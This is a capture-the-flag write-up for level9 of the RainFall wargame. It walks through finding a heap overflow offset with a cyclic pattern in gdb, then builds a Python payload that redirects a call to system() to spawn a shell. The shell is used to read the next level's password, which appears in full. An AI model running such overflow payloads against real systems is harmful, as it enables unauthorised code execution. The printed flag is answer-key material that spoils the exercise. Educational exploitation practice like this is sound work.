# Level9

This is what appears to be a cpp program. There is one vulnerable call to memset that we can overflow. First of all, let's find the offset

    $ msf-pattern_create -l200
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    (gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
    Starting program: /home/user/level9/level9 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

    Program received signal SIGSEGV, Segmentation fault.
    0x08048682 in main ()
    (gdb) i r
    eax            0x41366441	1094083649 <-- A6dA
    ecx            0x67413567	1732326759
    edx            0x804a0d4	134521044
    ebx            0x804a078	134520952
    esp            0xbffff640	0xbffff640
    ebp            0xbffff668	0xbffff668
    esi            0x0	0
    edi            0x0	0
    eip            0x8048682	0x8048682 <main+142>
    eflags         0x210287	[ CF PF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    (gdb) x $eax
    0x804a00c:	0x41306141 <-- get the buffer address

    $ msf-pattern_offset -q Ad6A
    [*] Exact match at offset 108

We can overflow EAX using the 109-112th characters.
The overflowed address is 0x804a00c.

The amazing idea of [chmadran](https://github.com/chmadran/) is that we can craft a payload that will overflow the eax by sending the address above, and inside the buffer we can make a call to system with "/bin/sh" as argument to execute it.

Address of system : 

    (gdb) run
    Starting program: /home/user/level9/level9 
    [Inferior 1 (process 3597) exited with code 01]
    (gdb) p system
    $1 = {<text variable, no debug info>} 0xb7d86060 <system>

Now we can craft the payload :

    level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + ";/bin/sh")')
    sh: 1: 
        : not found
    $ cd ../bonus0
    $ cat .pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
